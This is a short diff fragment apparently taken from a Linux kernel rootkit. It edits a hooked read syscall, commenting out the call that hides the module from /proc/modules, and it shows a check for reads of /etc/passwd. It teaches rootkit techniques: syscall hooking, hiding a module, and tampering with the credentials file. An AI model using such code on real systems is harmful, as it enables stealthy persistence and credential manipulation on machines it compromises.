@@ -232,9 +232,9 @@ asmlinkage long new_sys_read(unsigned int fd, char __user *buf, size_t count) {
 	path_put(path);
 
     // Entry point into hiding module
-	if(strcmp(pathname, "/proc/modules")==0){
-        ret = remove_rootkit(buf, ret);
-    }
+// 	if(strcmp(pathname, "/proc/modules")==0){
+//         ret = remove_rootkit(buf, ret);
+//     }
     
     //check if it's the files we want
 	if(strcmp(pathname, "/etc/passwd")==0){
